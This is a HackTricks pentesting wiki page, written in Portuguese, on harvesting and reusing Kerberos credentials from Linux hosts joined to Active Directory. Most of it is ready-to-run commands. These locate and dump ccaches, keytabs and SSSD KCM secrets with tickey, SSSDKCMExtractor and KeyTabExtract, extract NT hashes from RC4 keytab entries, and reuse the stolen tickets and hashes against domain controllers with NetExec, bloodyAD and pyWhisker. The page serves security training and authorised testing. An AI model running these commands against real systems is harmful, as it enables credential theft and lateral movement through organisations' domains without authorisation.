# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Uma máquina Linux também pode estar presente em um ambiente do Active Directory.

Uma máquina Linux dentro de um AD pode **armazenar material do Kerberos localmente**: ccaches de usuários, keytabs de máquinas/serviços e secrets gerenciados pelo SSSD. Esses artefatos geralmente podem ser reutilizados como qualquer outra credencial do Kerberos. Para ler a maioria deles, você precisará ser o usuário proprietário do ticket ou **root** na máquina.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Enumeration

### Enumeração de AD a partir do Linux

Se você tiver acesso a um AD pelo Linux (ou ao bash no Windows), poderá tentar usar [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) para enumerar o AD.

Você também pode consultar a página a seguir para conhecer **outras formas de enumerar o AD a partir do Linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

O FreeIPA é uma **alternativa** de código aberto ao **Active Directory** do Microsoft Windows, principalmente para ambientes **Unix**. Ele combina um **diretório LDAP** completo com um Centro de Distribuição de Chaves (**KDC**) do **Kerberos** MIT, para um gerenciamento semelhante ao Active Directory. Utilizando o **Certificate System** Dogtag para o gerenciamento de certificados da CA e da RA, ele oferece suporte à autenticação **multifator**, incluindo smartcards. O SSSD é integrado aos processos de autenticação Unix.<sup>[[14]](#references)[[15]](#references)</sup> Saiba mais sobre ele em:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefatos de hosts ingressados no domínio

Antes de lidar com tickets, identifique **como o host foi ingressado no AD** e **onde o material do Kerberos está realmente armazenado**. Em hosts Linux modernos, isso geralmente é gerenciado por `realmd` + `adcli` + `sssd`, e não apenas por arquivos simples em `/tmp`.<sup>[[10]](#references)</sup>
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Isso informa rapidamente se o host confia no AD, se o SSSD está armazenando identidades ou tickets em cache e se **machine/service keytabs** ou **KCM secrets** estão disponíveis para abuso.<sup>[[4]](#references)[[10]](#references)</sup>

## Brincando com tickets

### Pass The Ticket

Nesta página, você encontrará diferentes locais onde pode **encontrar tickets Kerberos dentro de um host Linux**. Na página a seguir, você aprenderá como transformar esses formatos de tickets CCache em Kirbi (o formato necessário para uso no Windows) e também como realizar um ataque PTT:

{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Se você quiser conhecer os **workflows específicos do Linux para harvesting de tickets** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, etc.), consulte a página dedicada:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Reutilização de tickets CCACHE a partir de /tmp

Os arquivos CCACHE são formatos binários para **armazenar credenciais Kerberos**. `FILE:/tmp/krb5cc_%{uid}` ainda é comum, mas as implantações modernas do Linux também usam `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` ou `KCM:%{uid}`. Verifique a variável de ambiente **`KRB5CCNAME`** e a configuração `default_ccache_name` antes de presumir que os tickets estão em `/tmp`.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### Reutilização de tickets CCACHE a partir do keyring

**Tickets Kerberos armazenados na memória de um processo podem ser extraídos**, especialmente quando a proteção ptrace da máquina está desabilitada (`/proc/sys/kernel/yama/ptrace_scope`). Uma ferramenta útil para esse fim está disponível em [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), facilitando a extração ao injetar código nas sessões e realizar o dumping dos tickets em `/tmp`.<sup>[[1]](#references)[[16]](#references)</sup>

Para configurar e usar essa ferramenta, siga as etapas abaixo:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Este procedimento tentará injetar em várias sessões, indicando sucesso ao armazenar os tickets extraídos em `/tmp`, seguindo a convenção de nomenclatura `__krb_UID.ccache`.<sup>[[1]](#references)</sup>

### Reutilização de tickets CCACHE do SSSD KCM

O SSSD mantém uma cópia do database no caminho `/var/lib/sss/secrets/secrets.ldb`. A chave correspondente é armazenada como um arquivo oculto no caminho `/var/lib/sss/secrets/.secrets.mkey`. Por padrão, a chave só pode ser lida se você tiver permissões de **root**.<sup>[[4]](#references)</sup>

A execução de **`SSSDKCMExtractor`** com os parâmetros --database e --key analisará o database e **descriptografará os secrets**.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
O extractor imprime payloads JSON brutos do Kerberos; converta-os em um ticket cache utilizável ou em outro formato de ticket antes das operações de pass-the-cache/pass-the-ticket.<sup>[[4]](#references)</sup>

### Triagem rápida de keytab
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Extrair contas de /etc/krb5.keytab

As chaves de contas de serviço, essenciais para serviços executados com privilégios de root, são armazenadas com segurança em arquivos **`/etc/krb5.keytab`**. Essas chaves, semelhantes a senhas de serviços, exigem estrita confidencialidade.<sup>[[5]](#references)</sup>

Para inspecionar o conteúdo do arquivo keytab, **`klist`** pode ser utilizado. No Linux, `klist -k -K -e` exibe os principals, os números de versão das chaves, os tipos de criptografia e o material bruto das chaves. Se o tipo de chave for **23 / RC4-HMAC**, o valor da chave também será o **hash NT** desse principal.<sup>[[6]](#references)[[17]](#references)</sup>
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Para usuários Linux, **`KeyTabExtract`** oferece funcionalidade para extrair o hash RC4 HMAC, que pode ser usado para reutilização de hashes NTLM. Observe que isso só ajuda quando o keytab ainda contém material **etype 23 / RC4-HMAC**. Em ambientes **AES-only**, talvez você não obtenha um hash NT reutilizável, mas ainda poderá se autenticar diretamente com o keytab via Kerberos.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
No macOS, **`bifrost`** serve como uma ferramenta para análise de arquivos keytab.<sup>[[8]](#references)</sup>
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Utilizando as informações de contas e hashes extraídas, conexões com servidores podem ser estabelecidas usando ferramentas como **`NetExec`**.<sup>[[9]](#references)</sup>
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```
### Reutilizar a conta da máquina de `/etc/krb5.keytab`

Em sistemas associados ao domínio por `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` geralmente contém a **conta do computador** e um ou mais **principals de host/serviço**. Se você tiver **root**, não faça apenas um dump: use um dos principals listados por `klist -k` para solicitar um TGT e operar como o próprio host Linux.<sup>[[10]](#references)</sup>
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Isso é especialmente útil quando o próprio **objeto de computador** possui direitos delegados no AD ou quando o host pode recuperar outros secrets, como uma **gMSA**.<sup>[[13]](#references)</sup>

### Reutilizar material Kerberos roubado com ferramentas de AD com foco em Linux

Quando você tem um `ccache` válido ou um keytab utilizável, pode operar contra o AD **diretamente do Linux**, sem converter tudo primeiro para formatos do Windows. Muitas ferramentas modernas aceitam `KRB5CCNAME` / autenticação Kerberos nativamente.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Esta é uma boa ponte entre **Linux post-exploitation** e **abuso de objetos AD**. Para os próprios caminhos de abuso no nível dos objetos, consulte:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Artefatos de gMSA / Managed Service Account no Linux

Deployments recentes de Linux podem consumir **Managed Service Accounts** diretamente do AD. Na prática, isso significa que, após comprometer um servidor Linux, você pode encontrar não apenas o keytab do host, mas também **service-specific keytabs** gerados a partir de uma gMSA. Locais comuns para inspeção incluem `/etc/gmsad.conf`, arquivos de configuração específicos do deployment e arquivos `*.keytab` adicionais em `/etc`.<sup>[[2]](#references)[[13]](#references)</sup>
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Isso fornece uma identidade Kerberos reutilizável para os SPNs associados a essa gMSA **sem tocar em nenhum endpoint Windows**.<sup>[[13]](#references)</sup> Para abuso de gMSA/dMSA **no domínio** após obter privilégios mais altos no AD, consulte:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Como atacar o Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Acessando o AD com uma conta de serviço gerenciada – Integrando sistemas RHEL diretamente ao Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Variáveis de ambiente do Kerberos – Documentação do MIT Kerberos](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – Documentação do MIT Kerberos](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: Os tipos de criptografia RC4-HMAC do Kerberos usados pelo Microsoft Windows](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Usando Kerberos | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Descobrindo e ingressando em domínios de identidade | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [Guia do usuário do bloodyAD](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [Sobre | Documentação do FreeIPA](https://www.freeipa.org/About.html)
- [15] [Notas de versão do FreeIPA 4.11.0](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – Documentação do kernel Linux](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – Documentação do MIT Kerberos](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
